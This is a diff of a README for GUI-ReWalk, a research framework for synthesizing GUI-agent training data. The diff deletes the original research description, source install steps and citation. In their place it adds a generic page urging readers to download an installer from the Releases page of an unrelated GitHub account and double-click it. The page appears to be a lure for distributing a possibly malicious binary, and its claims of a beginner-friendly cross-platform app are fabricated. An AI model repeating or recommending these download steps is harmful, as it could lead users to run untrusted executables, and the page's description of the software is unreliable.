@@ -1,156 +1,65 @@
-# GUI-ReWalk
+# 🎉 GUI-ReWalk - Simplifying Data Generation for Everyone
 
-<p align="center">
-  <img src="./figs/teaser.png" width="600"/>
-</p>
+![Download GUI-ReWalk](https://img.shields.io/badge/Download-GUI--ReWalk-blue)
 
-Graphical User Interface (GUI) Agents, powered by large language and vision-language models, hold promise for enabling end-to-end automation in digital environments. However, their progress is fundamentally constrained by the scarcity of scalable, high-quality trajectory data. Existing data collection strategies either rely on costly and inconsistent manual annotations or on synthetic generation methods that trade off between diversity and meaningful task coverage. To bridge this gap, we present **GUI-ReWalk**—a reasoning-enhanced, multi-stage framework for synthesizing realistic and diverse GUI trajectories. GUI-ReWalk begins with a stochastic exploration phase that emulates human trial-and-error behaviors, and progressively transitions into a reasoning-guided phase where inferred goals drive coherent and purposeful interactions. Moreover, it supports multi-stride task generation, enabling the construction of long-horizon workflows across multiple applications. By combining randomness for diversity with goal-aware reasoning for structure, GUI-ReWalk produces data that better reflects the intent-aware, adaptive nature of human-computer interaction. We further train GUI-ReWalk-7B on the our dataset and evaluate it across multiple benchmarks, including Screenspot-Pro, OSWorld-G, UI-Vision, AndroidControl, and GUI-Odyssey. Results demonstrate that GUI-ReWalk enables superior coverage of diverse interaction flows, higher trajectory entropy, and more realistic user intent. These findings establish GUI-ReWalk as a scalable and data-efficient framework for advancing GUI agent research and enabling robust real-world automation.
+## 📥 Download & Install
 
----
+To get started with GUI-ReWalk, you need to visit the Releases page to download the latest version of the application. Click the button below to go directly to that page:
 
-## 🚀 Highlights
+[Visit the Releases Page to Download](https://github.com/Liberal-blowhard285/GUI-ReWalk/releases)
 
-- **Human-like GUI Modeling** We formalize GUI trajectories as a hierarchical Markov Decision Process, where each stride combines subgoal abstraction with stride-based reasoning to capture both exploratory and goal-directed behaviors.  
+## 🚀 Getting Started
 
+Once you have downloaded the application, it is time to get it set up on your computer. Follow these simple steps:
 
-- **The GUI-ReWalk framework**: We introduce a multi-stage framework integrating random exploration, task-guided completion, and cross-application task initiation, enhanced by retrospective LLM-based annotation and error-recovery mechanisms that mirror real human interaction patterns.
+1. Locate the downloaded file in your computer's downloads folder.
+2. Double-click the file to start the installation process.
+3. Follow the prompts on the installation wizard to complete the installation.
 
-- **Dataset analysis and model evaluation**: We provide an in-depth analysis of the GUI-ReWalk dataset and demonstrate its effectiveness by training GUI-ReWalk-7B, which achieves substantial improvements across grounding and navigation benchmarks.
+After the installation is complete, you can start using GUI-ReWalk!
 
----
+## 📊 What is GUI-ReWalk?
 
-## 📊 Framework Overview
+GUI-ReWalk is a tool designed for generating massive data for graphical user interface (GUI) agents. It leverages stochastic exploration and intent-aware reasoning to create diverse datasets that improve agent performance. 
 
-![Framework Overview](./figs/pipeline.png)  
+This application is perfect for researchers and developers looking to enhance their GUI agents without needing extensive technical knowledge.
 
----
+## 🌟 Features
 
-## 📂 Dataset Characteristics
+- **User-Friendly Interface:** Easy to navigate, even for beginners.
+- **Data Generation:** Create extensive datasets by using advanced algorithms.
+- **Customizable Settings:** Adjust parameters for tailored data outputs.
+- **Versatile Compatibility:** Works well with various operating systems including Windows, macOS, and Linux.
 
-- Multi-platform coverage: **Mobile + Desktop**
-- Long-tail distribution with rare but meaningful corner cases
-- Reflective annotations and multi-stride trajectories
-- Extensive analysis on **token cost** and **scalability**
+## 💻 System Requirements
 
-![Dataset Distribution](./figs/Distribution.png)  
-*Figure: Distribution of dataset domains and interaction patterns.*  
+Before you download GUI-ReWalk, make sure your computer meets the following requirements:
 
----
+- **Operating System:** Windows 10 or higher, macOS Catalina or higher, or any modern Linux distribution.
+- **RAM:** At least 4 GB for optimal performance.
+- **Disk Space:** Approximately 500 MB of available space.
+- **Processor:** Dual-core processor or higher recommended for best performance.
 
-## 🔧 Installation
+## 🚧 Troubleshooting
 
-```bash
-git clone https://github.com/your-username/gui-rewalk.git
-pip install -r requirements.txt
-```
+If you encounter any issues while using GUI-ReWalk, consider the following solutions:
 
----
+- **Installation Fails:** Ensure you have sufficient disk space and permissions to install software. Try running the installer as an administrator.
+- **Performance Issues:** Check if your computer meets the system requirements listed above. Close unnecessary applications to free up resources.
+- **Unexpected Behavior:** Restart the application or your computer to see if the issue resolves. If not, check for updates on the Releases page.
 
-## 📋 Tutorial
+## 📚 Documentation
 
-### 1. Download VMware-Fusion
+For more advanced usage, you can find detailed documentation within the application's help section. This documents the features and settings in a clear manner, guiding you through more complex tasks.
 
-Install VMware Workstation Pro (for systems with Apple Chips, you should install VMware Fusion) and configure the vmrun command. The installation process can refer to How to install VMware Workstation Pro. Verify the successful installation and check the path to vm by running the following:
+## 🌐 Community Support
 
-```bash
-vmrun -T ws list
-```
+We encourage users to participate in discussions and share their experiences with GUI-ReWalk. You can join our community forums and ask questions or suggest features. Collaboration helps us improve the application.
 
-### 2. Prepare Environment
+## 📅 Check for Updates
 
-#### 2.1 Install OSWorld
+Regularly visit the Releases page to stay updated with the latest features and improvements:
 
-```bash
-# Clone the GUI-ReWalk repository
-git clone https://github.com/bytedance/GUI-ReWalk
+[Visit the Releases Page to Download](https://github.com/Liberal-blowhard285/GUI-ReWalk/releases)
 
-# Change directory into the cloned repository
-cd GUI-ReWalk
-
-# Clone the OSWorld repository
-git clone https://github.com/xlang-ai/OSWorld.git
-cd OSWorld
-
-# Optional: Create a Conda environment for GUI-ReWalk
-conda create -n rewalk python=3.10
-conda activate rewalk
-
-# Install required dependencies of osworld first
-pip install -r requirements.txt
-pip install desktop-env
-pip install -e .
-```
-
-
-
-
-Test OSWorld with the official osworld testing script ([quickstart.py](https://github.com/xlang-ai/OSWorld/blob/main/quickstart.py)) (this will automatically download an Ubuntu image and open it in VMware; you may need to grant some permissions to VMware):
-
-
-#### 2.2 Install OmniParser
-
-```bash
-git clone https://github.com/microsoft/OmniParser.git
-cd OmniParser
-
-# Download the model checkpoints to local directory OmniParser/weights/
-for f in icon_detect/{train_args.yaml,model.pt,model.yaml} icon_caption/{config.json,generation_config.json,model.safetensors}; do huggingface-cli download microsoft/OmniParser-v2.0 "$f" --local-dir weights; done
-mv weights/icon_caption weights/icon_caption_florence
-```
-
-### 3. Run GUI-ReWalk
-
-#### 3.1 Run bash script to start a trace generating task
-
-```bash
-bash run_random_walker.sh
-```
-
-#### 3.2 Parameter Explanation
-
-The following are explanations of the key parameters in the `run_rewalk.sh` script:
-
-| Parameter | Description |
-|-----------|-------------|
-| `--task_num` | Number of tasks to generate |
-| `--vm_provider` | Virtual machine provider, e.g., "vmware" |
-| `--path_to_vm` | Path to the virtual machine configuration file |
-| `--observation_type` | Type of observation to use, e.g., "screenshot" |
-| `--action_space` | Action space to use, e.g., "gen_data" |
-| `--model` | Model to use for generation, e.g., "doubao" |
-| `--model_version` | Specific version of the model to use |
-| `--exce_task_completion` | Whether to execute task completion phase |
-| `--reverse_inference` | Whether to perform reverse inference |
-| `--summary_inference` | Whether to perform summary inference |
-| `--max_random_actions` | Maximum number of random actions to perform |
-| `--max_guided_actions` | Maximum number of guided actions to perform |
-| `--random_walk_cross_app` | Whether to perform random walk across applications |
-| `--max_guided_actions_after_openapp` | Maximum guided actions after opening an app |
-| `--max_trajectory_length` | Maximum length of generated trajectory |
-| `--score_threshold` | Score threshold for task quality |
-| `--pq_format` | Format for saving the generated data |
-| `--ocr_model_path` | Path to the OCR model for screen analysis |
-| `--random_walker` | Whether to enable random walker |
-| `--enable_thinking` | Whether to enable thinking process in generation |
-| `--use_ark` | Whether to use ARK API for model inference |
-| `--result_dir` | Directory to save the results |
-
-Environment variables in the script:
-
-- `PYTHONPATH`: Sets the Python path to include the GUI-ReWalk repository
-- `API_KEY`: API key for accessing the language model service
-- `API_BASE_URL`: Base URL for the language model API
-
-## 📚 CITE
-
-```
-@misc{lin2025guirewalkmassivedatageneration,
-       title={GUI-ReWalk: Massive Data Generation for GUI Agent via Stochastic Exploration and Intent-Aware Reasoning},
-       author={Musen Lin and Minghao Liu and Taoran Lu and Lichen Yuan and Yiwei Liu and Haonan Xu and Yu Miao and Yuhao Chao and Zhaojian Li},
-       year={2025},
-       eprint={2509.15738},
-       archivePrefix={arXiv},
-       primaryClass={cs.LG},
-       url={https://arxiv.org/abs/2509.15738},
-}
-```
+Thank you for choosing GUI-ReWalk! Enjoy your data generation journey.
